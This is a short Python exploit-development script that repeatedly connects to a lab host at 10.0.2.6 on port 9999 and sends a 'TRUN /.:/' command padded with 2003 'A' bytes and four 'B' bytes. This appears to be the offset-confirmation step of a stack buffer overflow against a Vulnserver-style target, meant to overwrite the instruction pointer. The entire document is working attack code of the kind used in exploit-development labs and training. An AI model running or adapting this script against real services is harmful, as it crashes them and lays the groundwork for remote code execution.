#!/usr/bin/python3
import sys
import socket
from time import sleep

buffer = b"A" * 2003 + b"B" * 4

while True:
   try:
       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       sock.connect(('10.0.2.6', 9999))
       payload = b'TRUN /.:/' + buffer
       sock.send(payload)
       sock.close()
   except:
       print("Error connecting to the server")
       sys.exit()